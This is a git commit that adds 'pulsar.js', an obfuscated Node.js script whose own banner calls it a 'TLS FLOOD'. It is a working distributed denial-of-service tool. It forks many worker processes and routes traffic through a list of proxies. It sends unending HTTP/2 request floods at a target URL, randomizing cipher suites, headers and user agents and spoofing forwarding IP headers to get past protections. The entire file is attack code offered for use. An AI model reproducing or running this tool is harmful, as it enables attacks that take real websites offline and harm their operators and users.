bb6889f710218c0a2683c262fe3f81b07814ff97
dungweb123 <145241644+dungweb123@users.noreply.github.com>
2023-11-11 19:24:08 +0700

    Add files via upload

---
+++ pulsar.js
@@ -0,0 +1,208 @@
+var _0xccf7 = ["url", "fs", "http2", "http", "tls", "net", "cluster", "colors", "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA", "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA", "options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA", ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-GCM-SHA256:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS:!RC4", "EECDH+AESGCM:EDH+AESGCM:CHACHA20:!SHA1:!SHA256:!SHA384", "EECDH+AESGCM:EDH+AESGCM", "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL", "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-US,en;q=0.5", "en-US,en;q=0.9", "de-CH;q=0.7", "da, en-gb;q=0.8, en;q=0.7", "cs;q=0.5", "deflate, gzip, br", "gzip", "deflate", "br", "no-cache", "max-age=0", "?s=", "/?", "", "?q=", "?true=", "?", "&", "&&", "and", "=", "+", "https://www.google.com", "https://check-host.net", "https://www.facebook.com", "https://google.com", "https://youtube.com", "https://facebook.com", "Microsoft Edge", "Google Chrome", "Firefox", "Safari", "Opera", "Chrome Android", "Samsung Internet", "WebView Android", "Android", "Chrome OS", "Chromium OS", "iOS", "Linux", "macOS", "Unknown", "Windows", "RequestError", "StatusCodeError", "CaptchaError", "CloudflareError", "ParseError", "ParserError", "SELF_SIGNED_CERT_IN_CHAIN", "ECONNRESET", "ERR_ASSERTION", "ECONNREFUSED", "EPIPE", "EHOSTUNREACH", "ETIMEDOUT", "ESOCKETTIMEDOUT", "EPROTO", "setMaxListeners", "warning", "code", "includes", "name", "on", "unhandledRejection", "uncaughtException", "random", "length", "floor", ".", "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", "charAt", "argv", "\x09", "log", "bold", "blue", "\x09\x09Pulsar [ TLS FLOOD SHARE BY VILLAIN] <3", "\x09\x09Prepare a user-agent list", "exit", "\x0A", "split", "replace", "utf-8", "readFileSync", "ua.txt", "isMaster", "fork", "rainbow", "Pulsar attacking ?", "Concac !", "parse", ":", "path", "https", "host", "1", ";v=105,Not;A Brand;v=99,Chromium;v=105", "DENY", "nosniff", "1; mode=block", "document", "navigate", "none", "?1", "trailers", "Max-Forwards", "client-x-cache-on, client-x-cache-remote-on, client-x-check-cacheable, client-x-get-cache-key, client-x-get-extracted-values, client-x-get-ssl-client-session-id, client-x-get-true-cache-key, client-x-serial-no, client-x-get-request-id,client-x-get-nonces,client-x-get-client-ip,client-x-feo-trace", "HTTP", "Keep-Alive", "CONNECT", ":443", "setSocketKeepAlive", "request", "connect", "href", "join", "getCiphers", "TLS_method", "GREASE:X25519:x25519", "rsa_pss_rsae_sha256", "h2", "utf8", "setEncoding", "data", "response", "close", "end"];
+const url = require(_0xccf7[0]),
+    fs = require(_0xccf7[1]),
+    http2 = require(_0xccf7[2]),
+    http = require(_0xccf7[3]),
+    tls = require(_0xccf7[4]),
+    net = require(_0xccf7[5]),
+    cluster = require(_0xccf7[6]),
+    colors = require(_0xccf7[7]);
+cplist = [_0xccf7[8], _0xccf7[9], _0xccf7[10], _0xccf7[11], _0xccf7[12], _0xccf7[13], _0xccf7[14], _0xccf7[9], _0xccf7[15], _0xccf7[14], _0xccf7[16], _0xccf7[17], _0xccf7[18], _0xccf7[19], _0xccf7[20], _0xccf7[21]], accept_header = [_0xccf7[22], _0xccf7[23], _0xccf7[24], _0xccf7[23], _0xccf7[25]], lang_header = [_0xccf7[26], _0xccf7[27], _0xccf7[28], _0xccf7[29], _0xccf7[30], _0xccf7[31], _0xccf7[32]], encoding_header = [_0xccf7[33], _0xccf7[34], _0xccf7[35], _0xccf7[36]], control_header = [_0xccf7[37], _0xccf7[38]], pathts = [_0xccf7[39], _0xccf7[40], _0xccf7[41], _0xccf7[42], _0xccf7[43], _0xccf7[44]], querys = [_0xccf7[41], _0xccf7[45], _0xccf7[41], _0xccf7[46], _0xccf7[47], _0xccf7[48], _0xccf7[49], _0xccf7[44]], refers = [_0xccf7[50], _0xccf7[51], _0xccf7[52], _0xccf7[53], _0xccf7[54], _0xccf7[55]], browsers = [_0xccf7[56], _0xccf7[57], _0xccf7[58], _0xccf7[59], _0xccf7[60], _0xccf7[61], _0xccf7[62], _0xccf7[63]], sechuas = [_0xccf7[64], _0xccf7[65], _0xccf7[66], _0xccf7[67], _0xccf7[68], _0xccf7[69], _0xccf7[70], _0xccf7[71]], ignoreNames = [_0xccf7[72], _0xccf7[73], _0xccf7[74], _0xccf7[75], _0xccf7[76], _0xccf7[77]], ignoreCodes = [_0xccf7[78], _0xccf7[79], _0xccf7[80], _0xccf7[81], _0xccf7[82], _0xccf7[83], _0xccf7[84], _0xccf7[85], _0xccf7[86]];
+process[_0xccf7[92]](_0xccf7[94], function (_0x3055x9) {
+    if (_0x3055x9[_0xccf7[89]] && ignoreCodes[_0xccf7[90]](_0x3055x9[_0xccf7[89]]) || _0x3055x9[_0xccf7[91]] && ignoreNames[_0xccf7[90]](_0x3055x9[_0xccf7[91]])) {
+        return !1
+    }
+})[_0xccf7[92]](_0xccf7[93], function (_0x3055x9) {
+    if (_0x3055x9[_0xccf7[89]] && ignoreCodes[_0xccf7[90]](_0x3055x9[_0xccf7[89]]) || _0x3055x9[_0xccf7[91]] && ignoreNames[_0xccf7[90]](_0x3055x9[_0xccf7[91]])) {
+        return !1
+    }
+})[_0xccf7[92]](_0xccf7[88], (_0x3055x9) => {
+    if (_0x3055x9[_0xccf7[89]] && ignoreCodes[_0xccf7[90]](_0x3055x9[_0xccf7[89]]) || _0x3055x9[_0xccf7[91]] && ignoreNames[_0xccf7[90]](_0x3055x9[_0xccf7[91]])) {
+        return !1
+    }
+})[_0xccf7[87]](0);
+function accept() {
+    return accept_header[Math[_0xccf7[97]](Math[_0xccf7[95]]() * accept_header[_0xccf7[96]])]
+}
+function lang() {
+    return lang_header[Math[_0xccf7[97]](Math[_0xccf7[95]]() * lang_header[_0xccf7[96]])]
+}
+function refer() {
+    return refers[Math[_0xccf7[97]](Math[_0xccf7[95]]() * refers[_0xccf7[96]])]
+}
+function encoding() {
+    return encoding_header[Math[_0xccf7[97]](Math[_0xccf7[95]]() * encoding_header[_0xccf7[96]])]
+}
+function controling() {
+    return control_header[Math[_0xccf7[97]](Math[_0xccf7[95]]() * control_header[_0xccf7[96]])]
+}
+function cipher() {
+    return cplist[Math[_0xccf7[97]](Math[_0xccf7[95]]() * cplist[_0xccf7[96]])]
+}
+function randpath() {
+    return pathts[Math[_0xccf7[97]](Math[_0xccf7[95]]() * pathts[_0xccf7[96]])]
+}
+function query() {
+    return querys[Math[_0xccf7[97]](Math[_0xccf7[95]]() * querys[_0xccf7[96]])]
+}
+function browser() {
+    return browsers[Math[_0xccf7[97]](Math[_0xccf7[95]]() * browsers[_0xccf7[96]])]
+}
+function sechua() {
+    return sechuas[Math[_0xccf7[97]](Math[_0xccf7[95]]() * sechuas[_0xccf7[96]])]
+}
+const ip_spoof = () => {
+    const _0x3055x15 = () => {
+        return Math[_0xccf7[97]](Math[_0xccf7[95]]() * 255)
+    };
+    return `${_0xccf7[41]}${_0xccf7[41]}${_0xccf7[41]}${_0x3055x15()}${_0xccf7[41]}${_0xccf7[98]}${_0xccf7[41]}${_0x3055x15()}${_0xccf7[41]}${_0xccf7[98]}${_0xccf7[41]}${_0x3055x15()}${_0xccf7[41]}${_0xccf7[98]}${_0xccf7[41]}${_0x3055x15()}${_0xccf7[41]}${_0xccf7[41]}${_0xccf7[41]}`
+};
+function randstr(_0x3055x17) {
+    var _0x3055x18 = _0xccf7[41];
+    var _0x3055x19 = _0xccf7[99];
+    var _0x3055x1a = _0x3055x19[_0xccf7[96]];
+    for (var _0x3055x1b = 0; _0x3055x1b < _0x3055x17; _0x3055x1b++) {
+        _0x3055x18 += _0x3055x19[_0xccf7[100]](Math[_0xccf7[97]](Math[_0xccf7[95]]() * _0x3055x1a))
+    };
+    return _0x3055x18
+}
+if (process[_0xccf7[101]][_0xccf7[96]] < 8) {
+    console[_0xccf7[103]](_0xccf7[102]);
+    console[_0xccf7[103]](_0xccf7[106][_0xccf7[105]][_0xccf7[104]]);
+    console[_0xccf7[103]](_0xccf7[102]);
+    console[_0xccf7[103]](_0xccf7[107]);
+    process[_0xccf7[108]](0)
+};
+var rate = process[_0xccf7[101]][6];
+var method = process[_0xccf7[101]][2];
+var proxys = fs[_0xccf7[113]](process[_0xccf7[101]][4], _0xccf7[112]).toString()[_0xccf7[111]](/\r/g, _0xccf7[41])[_0xccf7[110]](_0xccf7[109]);
+function proxyr() {
+    return proxys[Math[_0xccf7[97]](Math[_0xccf7[95]]() * proxys[_0xccf7[96]])]
+}
+var fakeuas = fs[_0xccf7[113]](_0xccf7[114], _0xccf7[112]).toString()[_0xccf7[111]](/\r/g, _0xccf7[41])[_0xccf7[110]](_0xccf7[109]);
+function fakeua() {
+    return fakeuas[Math[_0xccf7[97]](Math[_0xccf7[95]]() * fakeuas[_0xccf7[96]])]
+}
+if (cluster[_0xccf7[115]]) {
+    const dateObj = new Date();
+    for (var bb = 0; bb < process[_0xccf7[101]][7]; bb++) {
+        cluster[_0xccf7[116]]()
+    };
+    console[_0xccf7[103]](_0xccf7[118][_0xccf7[117]][_0xccf7[104]]);
+    setTimeout(() => {
+        console[_0xccf7[103]](_0xccf7[119][_0xccf7[105]][_0xccf7[104]]);
+        process[_0xccf7[108]](-1)
+    }, process[_0xccf7[101]][5] * 1000)
+} else {
+    function flood() {
+        var _0x3055x25 = url[_0xccf7[120]](process[_0xccf7[101]][3]);
+        var _0x3055x26 = fakeua();
+        const _0x3055x27 = ip_spoof();
+        var _0x3055x28 = query();
+        var _0x3055x29 = refer();
+        var _0x3055x2a = cipher();
+        var _0x3055x2b = proxyr()[_0xccf7[110]](_0xccf7[121]);
+        var _0x3055x2c = {
+            ":method": method,
+            ":path": _0x3055x25[_0xccf7[122]] + randpath() + randstr(15) + _0x3055x28 + randstr(15),
+            ":scheme": _0xccf7[123],
+            "Origin": _0x3055x25[_0xccf7[124]],
+            "Accept": accept(),
+            "Accept-encoding": encoding(),
+            "Accept-Language": lang(),
+            "Cache-Control": controling(),
+            "DNT": _0xccf7[125],
+            "Sec-ch-ua": browser() + _0xccf7[126],
+            "sec-ch-ua-platform": sechua(),
+            "X-Frame-Options": _0xccf7[127],
+            "X-Content-Type-Options": _0xccf7[128],
+            "X-XSS-Protection": _0xccf7[129],
+            "sec-fetch-dest": _0xccf7[130],
+            "sec-fetch-mode": _0xccf7[131],
+            "sec-fetch-site": _0xccf7[132],
+            "sec-fetch-user": _0xccf7[133],
+            "sec-gpc": _0xccf7[125],
+            "TE": _0xccf7[134],
+            "Trailer": _0xccf7[135],
+            "Pragma": _0xccf7[136],
+            "Upgrade-Insecure-Requests": _0xccf7[125],
+            "X-Forwarded-Proto": _0xccf7[137],
+            "X-Forwarded-For": _0x3055x27,
+            "X-Forwarded-Host": _0x3055x27,
+            "Via": _0x3055x27,
+            "Client-IP": _0x3055x27,
+            "Real-IP": _0x3055x27,
+            "Referer": _0x3055x29,
+            "User-agent": _0x3055x26
+        };
+        const _0x3055x2d = new http.Agent({
+            keepAlive: true,
+            keepAliveMsecs: 50000,
+            maxSockets: 128
+        });
+        var _0x3055x2e = http[_0xccf7[142]]({
+            host: _0x3055x2b[0],
+            agent: _0x3055x2d,
+            globalAgent: _0x3055x2d,
+            port: _0x3055x2b[1],
+            timeout: 10000,
+            ciphers: _0x3055x2a,
+            headers: {
+                'Host': _0x3055x25[_0xccf7[124]],
+                'Proxy-Connection': _0xccf7[138],
+                'Connection': _0xccf7[138]
+            },
+            method: _0xccf7[139],
+            path: _0x3055x25[_0xccf7[124]] + _0xccf7[140]
+        }, function () {
+            _0x3055x2e[_0xccf7[141]](true)
+        });
+        _0x3055x2e[_0xccf7[92]](_0xccf7[143], function (_0x3055x2f, _0x3055x30, _0x3055x31) {
+            const _0x3055x32 = http2[_0xccf7[143]](_0x3055x25[_0xccf7[144]], {
+                createConnection: () => {
+                    return tls[_0xccf7[143]]({
+                        host: _0x3055x25[_0xccf7[124]],
+                        ciphers: tls[_0xccf7[146]]()[_0xccf7[145]](_0xccf7[121]) + _0x3055x2a,
+                        secureProtocol: _0xccf7[147],
+                        servername: _0x3055x25[_0xccf7[124]],
+                        uri: _0x3055x25[_0xccf7[124]],
+                        curve: _0xccf7[148],
+                        clientTimeout: 5000,
+                        clientmaxTimeout: 10000,
+                        challengesToSolve: 10,
+                        resolveWithFullResponse: true,
+                        HonorCipherOrder: true,
+                        Compression: false,
+                        UseStapling: true,
+                        SessionTickets: false,
+                        requestCert: true,
+                        gzip: true,
+                        port: 443,
+                        sigals: _0xccf7[149],
+                        strictSSL: false,
+                        secure: true,
+                        rejectUnauthorized: false,
+                        ALPNProtocols: [_0xccf7[150]],
+                        socket: _0x3055x30
+                    }, function () {
+                        for (let _0x3055x1b = 0; _0x3055x1b < rate; _0x3055x1b++) {
+                            const _0x3055x2e = _0x3055x32[_0xccf7[142]](_0x3055x2c);
+                            _0x3055x2e[_0xccf7[152]](_0xccf7[151]);
+                            _0x3055x2e[_0xccf7[92]](_0xccf7[153], (_0x3055x33) => {
+                                delete _0x3055x33
+                            });
+                            _0x3055x2e[_0xccf7[92]](_0xccf7[154], () => {
+                                _0x3055x2e[_0xccf7[155]]()
+                            });
+                            _0x3055x2e[_0xccf7[156]]()
+                        }
+                    })
+                }
+            })
+        });
+        _0x3055x2e[_0xccf7[156]]()
+    }
+    setInterval(() => {
+        flood()
+    })
+}
